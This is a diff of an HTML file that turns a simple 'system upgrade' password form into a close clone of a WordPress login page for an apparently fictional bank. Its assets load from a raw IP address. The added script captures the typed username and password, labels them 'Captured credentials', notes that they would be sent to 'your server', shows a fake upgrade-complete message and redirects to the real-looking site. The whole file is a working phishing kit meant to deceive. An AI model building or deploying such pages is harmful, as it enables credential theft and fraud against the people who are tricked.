@@ -1,24 +1,221 @@
 <!DOCTYPE html>
-<html>
+<html lang="en-US">
 <head>
-    <title>LNB System Upgrade</title>
-    <style>
-        body { font-family: Arial; background: #f5f5f5; padding: 50px; }
-        .login-box { background: white; padding: 30px; max-width: 400px; margin: 0 auto; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 3px; }
-        button { background: #2872fa; color: white; padding: 10px 20px; border: none; border-radius: 3px; cursor: pointer; width: 100%; }
-        .logo { text-align: center; color: #2872fa; font-weight: bold; margin-bottom: 20px; }
-    </style>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<title>Log In &lsaquo; Lindsen National Bank &#8212; WordPress</title>
+<meta name='robots' content='max-image-preview:large, noindex, noarchive' />
+<link rel='stylesheet' href='http://209.38.92.205:7000/wp-admin/load-styles.php?c=0&amp;dir=ltr&amp;load%5Bchunk_0%5D=dashicons,buttons,forms,l10n,login&amp;ver=6.8.3' media='all' />
+<meta name='referrer' content='strict-origin-when-cross-origin' />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="icon" href="http://209.38.92.205:7000/wp-content/uploads/2025/11/cropped-fav-32x32.png" sizes="32x32" />
+<link rel="icon" href="http://209.38.92.205:7000/wp-content/uploads/2025/11/cropped-fav-192x192.png" sizes="192x192" />
+<link rel="apple-touch-icon" href="http://209.38.92.205:7000/wp-content/uploads/2025/11/cropped-fav-180x180.png" />
+<meta name="msapplication-TileImage" content="http://209.38.92.205:7000/wp-content/uploads/2025/11/cropped-fav-270x270.png" />
+
+<style>
+/* Additional styles to ensure it looks identical */
+body.login {
+    background: #f0f0f1;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
+}
+#login {
+    width: 320px;
+    padding: 8% 0 0;
+    margin: auto;
+}
+.login h1 a {
+    background-image: url('http://209.38.92.205:7000/wp-content/uploads/2025/11/cropped-fav.png');
+    background-size: 84px;
+    background-position: center top;
+    background-repeat: no-repeat;
+    color: #3a3a3a;
+    height: 84px;
+    font-size: 20px;
+    font-weight: 400;
+    line-height: 1.3;
+    margin: 0 auto 25px;
+    padding: 0;
+    text-decoration: none;
+    width: 84px;
+    text-indent: -9999px;
+    outline: 0;
+    overflow: hidden;
+    display: block;
+}
+.login form {
+    margin-top: 20px;
+    margin-left: 0;
+    padding: 26px 24px 26px;
+    font-weight: 400;
+    overflow: hidden;
+    background: #fff;
+    border: 1px solid #c3c4c7;
+    box-shadow: 0 1px 3px rgba(0,0,0,.04);
+}
+.login label {
+    font-size: 14px;
+    line-height: 1.5;
+    display: block;
+    margin-bottom: 3px;
+}
+.login form .input, .login input[type=text], .login input[type=password] {
+    font-size: 16px;
+    line-height: 1;
+    width: 100%;
+    padding: 3px;
+    margin: 2px 6px 16px 0;
+    min-height: 30px;
+    border: 1px solid #8c8f94;
+    background: #fff;
+    color: #2c3338;
+}
+.wp-pwd {
+    position: relative;
+}
+.wp-hide-pw {
+    background: 0 0;
+    border: 1px solid transparent;
+    box-shadow: none;
+    font-size: 14px;
+    line-height: 2;
+    width: 2.5rem;
+    height: 2.5rem;
+    min-width: 40px;
+    min-height: 40px;
+    padding: 5px 9px;
+    position: absolute;
+    right: 0;
+    top: 0;
+}
+.button.button-large {
+    height: 30px;
+    line-height: 2.30769231;
+    padding: 0 12px 2px;
+}
+.button-primary {
+    background: #2271b1;
+    border-color: #2271b1;
+    color: #fff;
+}
+.button {
+    display: inline-block;
+    text-decoration: none;
+    font-size: 13px;
+    line-height: 2.15384615;
+    min-height: 30px;
+    margin: 0;
+    padding: 0 10px;
+    cursor: pointer;
+    border-width: 1px;
+    border-style: solid;
+    border-radius: 3px;
+    white-space: nowrap;
+    box-sizing: border-box;
+}
+#nav, #backtoblog {
+    font-size: 13px;
+    padding: 0 24px 0;
+}
+.screen-reader-text {
+    border: 0;
+    clip: rect(1px,1px,1px,1px);
+    clip-path: inset(50%);
+    height: 1px;
+    margin: -1px;
+    overflow: hidden;
+    padding: 0;
+    position: absolute;
+    width: 1px;
+    word-wrap: normal!important;
+}
+</style>
 </head>
-<body>
-    <div class="login-box">
-        <div class="logo">LINDEN NATIONAL BANK</div>
-        <h3>System Upgrade - Password Reset</h3>
-        <form action="https://formspree.io/f/YOUR-FORM-ID" method="POST">
-            <input type="text" name="username" placeholder="Username/Email" required>
-            <input type="password" name="password" placeholder="Password" required>
-            <button type="submit">Continue Upgrade</button>
-        </form>
-    </div>
+<body class="login no-js login-action-login wp-core-ui locale-en-us">
+<script>
+document.body.className = document.body.className.replace('no-js','js');
+</script>
+
+<h1 class="screen-reader-text">Log In</h1>
+<div id="login">
+    <h1 role="presentation" class="wp-login-logo"><a href="http://lindensennational.com/">Lindsen National Bank</a></h1>
+    
+    <form name="loginform" id="loginform" method="post">
+        <p>
+            <label for="user_login">Username or Email Address</label>
+            <input type="text" name="log" id="user_login" class="input" value="" size="20" autocapitalize="off" autocomplete="username" required="required" />
+        </p>
+
+        <div class="user-pass-wrap">
+            <label for="user_pass">Password</label>
+            <div class="wp-pwd">
+                <input type="password" name="pwd" id="user_pass" class="input password-input" value="" size="20" autocomplete="current-password" spellcheck="false" required="required" />
+                <button type="button" class="button button-secondary wp-hide-pw hide-if-no-js" data-toggle="0" aria-label="Show password">
+                    <span class="dashicons dashicons-visibility" aria-hidden="true">👁️</span>
+                </button>
+            </div>
+        </div>
+        <p class="forgetmenot"><input name="rememberme" type="checkbox" id="rememberme" value="forever" /> <label for="rememberme">Remember Me</label></p>
+        <p class="submit">
+            <input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In" />
+            <input type="hidden" name="redirect_to" value="http://lindensennational.com/wp-admin/" />
+            <input type="hidden" name="testcookie" value="1" />
+        </p>
+    </form>
+
+    <p id="nav">
+        <a class="wp-login-lost-password" href="http://lindensennational.com/wp-login.php?action=lostpassword">Lost your password?</a>
+    </p>
+    
+    <script>
+    function wp_attempt_focus() {
+        setTimeout( function() {
+            try {
+                d = document.getElementById( "user_login" );
+                d.focus();
+                d.select();
+            } catch( er ) {}
+        }, 200);
+    }
+    wp_attempt_focus();
+    </script>
+    
+    <p id="backtoblog">
+        <a href="http://lindensennational.com/">&larr; Go to Lindsen National Bank</a>
+    </p>
+</div>
+
+<script>
+// Simple password toggle functionality
+document.addEventListener('DOMContentLoaded', function() {
+    const toggleButton = document.querySelector('.wp-hide-pw');
+    const passwordInput = document.getElementById('user_pass');
+    
+    if (toggleButton && passwordInput) {
+        toggleButton.addEventListener('click', function() {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            this.setAttribute('data-toggle', type === 'password' ? '0' : '1');
+        });
+    }
+    
+    // Form submission handler
+    document.getElementById('loginform').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const username = document.getElementById('user_login').value;
+        const password = document.getElementById('user_pass').value;
+        
+        // Log credentials (in real scenario, this would send to your server)
+        console.log('Captured credentials:', { username, password });
+        alert('System upgrade completed successfully! Redirecting...');
+        
+        // Redirect to real site after capture
+        setTimeout(() => {
+            window.location.href = 'http://lindensennational.com/';
+        }, 2000);
+    });
+});
+</script>
+
 </body>
 </html>
